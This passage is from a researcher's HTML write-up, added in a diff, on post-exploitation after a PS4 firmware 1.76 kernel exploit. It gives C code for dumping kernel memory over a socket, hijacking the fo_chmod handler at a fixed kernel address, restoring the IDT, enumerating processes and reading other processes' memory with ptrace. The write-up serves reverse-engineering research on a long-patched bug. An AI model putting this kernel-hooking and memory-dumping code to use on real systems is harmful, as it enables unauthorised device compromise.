+struct sendto_args args = { sock, dump, 0x1000, 0, NULL, 0 };
+
+while(sys_sendto(td, &args) == EINTR);</code></pre>
+				
+				<br>
+				
+				<h2>Analysing the kernel dump</h2>
+				<p>
+					I scanned through the kernel address space and discovered that the kernel was stored in RAM as a <code>0xeac180</code> byte ELF from address <code>0xffffffff80700000</code>, and data was stored from <code>0xffffffff82cfc000</code> onwards.
+				</p>
+				
+				<p>
+					This ELF can be loaded into IDA Pro with all symbols.
+				</p>
+				
+				<br>
+				
+				<p>
+					We can now easily find the addresses needed to call other kernel functions, restore kernel state, hook other kernel function pointers, and much more.
+				</p>
+				
+				<br>
+				
+				<h2>Restoring kernel state</h2>
+				<p>
+					Whilst developing the FreeBSD exploit, we had the luxury of dumping the IDT with a debugger before and after triggering the exploit to see which bytes were corrupt, and fix them accordingly. Unfortunately, for PS4 we can only dump the IDT after triggering the exploit.
+				</p>
+				
+				<p>
+					Rather than inspecting all of the IDT entries manually for corruption, I found the <a href="https://github.com/freebsd/freebsd/blob/release/9.0.0/sys/amd64/amd64/machdep.c#L1641">IDT initialisation code in FreeBSD</a> and copied it into the PS4 payload using the function addresses from the kernel dump. This re-initialised the IDT to its correct state.
+				</p>
+				
+				<br>
+				
+				<h2>Kernel code execution under less critical context</h2>
+				<p>
+					As explained earlier, the payload executes under a very unstable double-fault context, such that accessing any unpaged memory will cause a triple fault and crash the system.
+				</p>
+				
+				<p>
+					This context is not very practical or safe for general kernel payload development. Instead, we use this initial code execution to hijack the <code>socketops->fo_chmod</code> handler:
+				</p>
+				
+				<pre><code>struct fileops *socketops = (struct fileops *)0xFFFFFFFF83242C40;
+original_fo_chmod = socketops->fo_chmod;
+socketops->fo_chmod = payload;</code></pre>
+				
+				<p>
+					After returning to userland, we can now re-enter the kernel by using the <code>fchmod</code> system call to trigger our second payload:
+				</p>
+				
+				<pre><code>int s = sceNetSocket("kernelTrigger", AF_INET, SOCK_STREAM, 0);
+
+if(s > 0) {
+	printf("Triggering second kernel payload\n");
+	fchmod(s, 0);
+}
+else printf("Failed to allocate socket\n");
+
+sceNetSocketClose(s);</code></pre>
+				
+				<p>
+					We have a lot more freedom in this context, and can easily restore the original handler when finished:
+				</p>
+				
+				<pre><code>// We are in a normal kernel context here
+int payload(void *fp, int mode, void *active_cred, struct thread *td) {
+	int (*sendto)(struct thread *td, struct sendto_args *uap) = (void *)sys_sendto;
+	
+	struct sendto_args args = { sock, payloadMessage, strlen(payloadMessage), 0, NULL, 0 };
+	sendto(td, &args);
+	
+	
+	// Restore original handler
+	struct fileops *socketops = (struct fileops *)0xFFFFFFFF83242C40;
+	socketops->fo_chmod = original_fo_chmod;
+	
+	return 22;
+}</code></pre>
+				
+				<br>
+				
+				<h2>Reliability</h2>
+				<p>
+					The exploit is fairly reliable, however there are a few odd cases. For example, occasionally the first kernel payload (called from the hijacked <code>#PF</code> handler) will be triggered twice:
+				</p>
+				
+				<pre><code>[+] Here goes...
+[+] Entered critical payload
+[+] Entered shellcode
+[+] UID: 0, GID: 0
+[+] Triggering second kernel payload
+[+] Entered main payload
+[+] Entered critical payload
+[+] Entered shellcode</code></pre>
+				
+				<p>
+					There are many potential explanations for what causes this, including some form of cache incoherency between processors, or preemption of the kernel task before the IDT is fixed.
+				</p>
+				
+				<p>
+					Since this is fairly rare, and it isn't much of an issue (I'd rather the payload was triggered twice than not triggered at all), I haven't bothered to look into exactly what causes this yet.
+				</p>
+				
+				<br>
+				
+				<h2>Filesystem</h2>
+				<p>
+					After completely breaking out of the sandbox and patching our process with the highest rights, our process has unrestricted access to the entire filesystem.
+				</p>
+				
+				<p>
+					I published <a href="https://gist.github.com/CTurt/27fe7f3c241f69be19e5">a listing of the root directory of the PS4</a> earlier this week.
+				</p>
+				
+				<p>
+					In particular, one interesting thing is the ability to dump decrypted PS4 NOR flash from the <code>sflash</code> partitions under <code>/dev/</code>. I haven't really had time to analyse these dumps completely yet, but it mostly consists of data in the <a href="http://www.psdevwiki.com/ps4/SLB2_structure">SLB2 format</a>.
+				</p>
+				
+				<br>
+				
+				<h2>Exploring other processes</h2>
+				<p>
+					Previously, we could only obtain information about the WebKit process which we hijacked, but now that we've patched our process with the highest credentials, we can access all processes.
+				</p>
+				
+				<p>
+					To list all processes, we can read the <code>kern.proc.pid</code> name of <code>sysctl</code>:
+				</p>
+				
+				<pre><code>#define CTL_KERN 1
+#define KERN_PROC 14
+#define KERN_PROC_PID 1
+
+int (*sysctl)(int *name, uint32_t namelen, void *oldp, size_t *oldlenp, void *newp, size_t newlen) = NULL;
+RESOLVE(1, sysctl);
+
+int pid, mib[4];
+size_t len;
+
+pid = 0;
+//pid = syscall(20); // getpid()
+
+mib[0] = CTL_KERN;
+mib[1] = KERN_PROC;
+mib[2] = KERN_PROC_PID;
+mib[3] = pid;
+
+if(sysctl(mib, 4, dump, &len, NULL, 0) == -1) perror("sysctl");
+else if(len > 0) {
+	char *name = dump + 0x1bf;
+	char *thread = dump + 0x18a;
+	
+	printf("  [+] PID %d, name: %s, thread: %s\n", pid, name, thread);
+}</code></pre>
+				
+				<p>
+					A list of all processes was also posted in my <a href="https://gist.github.com/CTurt/27fe7f3c241f69be19e5">recent gist</a>.
+				</p>
+				
+				<p>
+					Since these process numbers are not always the same, it is best to iterate over every PID until you find the one with the process name you are interested in. For example, to target the currently running game, search for a process with the name "eboot.bin":
+				</p>
+				
+				<pre><code>if(strcmp(name, "eboot.bin") == 0) patchPid = pid;</code></pre>
+				
+				<p>
+					The next stage is to read all mappings from the target process, which can be done with the <code>KERN_PROC_VMMAP</code> name of <code>sysctl</code>. Due to ASLR, the addresses of mappings will always be different, so you should read them dynamically.
+				</p>
+				
+				<p>
+					Once you've identified a mapping you want to dump, you can use <a href="https://www.freebsd.org/cgi/man.cgi?query=ptrace&apropos=0&sektion=2&manpath=FreeBSD+9.0-RELEASE&arch=amd64&format=html">ptrace</a> to read it:
+				</p>
+				
+				<pre><code>int result = ptrace(PTRACE_ATTACH, pid, NULL, NULL);
+
+printf("  [+] Attaching to SceShellUI: %d\n", result);
+
+unsigned long offset;
+struct ptrace_io_desc pt_desc;
+
+char *readbuf = mmap(NULL, mappingSize, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+
+for(offset = mappingAddress; offset < mappingAddress + mappingSize; offset += DUMP_SIZE) {
+	pt_desc.piod_op = PIOD_READ_D;
+	pt_desc.piod_addr = readbuf;
+	pt_desc.piod_offs = offset;
+	pt_desc.piod_len = DUMP_SIZE;
+	
+	int ret = ptrace(PT_IO, pid, &pt_desc, NULL);
+	if(!ret) sceNetSend(sock, readbuf, pt_desc.piod_len, 0);
+}</code></pre>
+				
+				<p>
+					However, when using <code>ptrace</code> to access the memory of another process, we encountered issues where the process would immediately restart after finishing with reading or writing. This would cause any patches to be lost.
+				</p>
+				
+				<p>
+					The solution is to just use <code>proc_rwmem</code> directly, from inside the kernel payload. With this, we can now dump the memory of any process, and make patches!
+				</p>
+				
+				<br>
+				
+				<h2>Summary</h2>
+				<p>
+					I'm going to finish the article at this point since I just wanted to provide a few examples of what can be done with the kernel exploit; there's so much else to be be explored that I don't think I'll ever get round to everything: the registry, save game encryption, system update process, capturing decrypted SSL traffic, etc.
+				</p>
+				
+				<p>
+					In conclusion, we have achieved kernel code execution on firmware 1.76 of the PS4. Fortunately, BadIRET has been long patched on later firmware versions, so this research hopefully shouldn't cause any adverse effects.
+				</p>
+				
+				<p>
+					This does however provide researchers the ability to reverse engineer the PS4 kernel, which was previously unavailable. One of the things we will probably spend the most time doing now is auditing the custom Sony system calls in the kernel dump, and searching for vulnerabilities which may be present on later firmware versions; but I'll probably take a long break from the PS4 first.
+				</p>
+				
+				<br>
+				
+				<h2>Thanks</h2>
+				<p>
+					The following people have helped me extensively along the way: explaining fundamental concepts to me, sharing ideas of new things to try, fixing problems with my code, and much more. So once again, "thanks to everyone involved", I couldn't have done it without your help!
+				</p>
+				
+				<ul>
+					<li>flatz (<a href="https://twitter.com/flat_z">@flat_z</a>)</li>
+					<li>Michael Coppola (<a href="https://twitter.com/mncoppola">@mncoppola</a>)</li>
+					<li>Adam Zabrocki (<a href="https://twitter.com/Adam_pi3">@Adam_pi3</a>)</li>
+					<li>Takezo</li>
+					<li>Yifan Lu (<a href="https://twitter.com/yifanlu">@yifanlu</a>)</li>
+				</ul>
+			</div>
+		</div>
+	</body>
+</html>
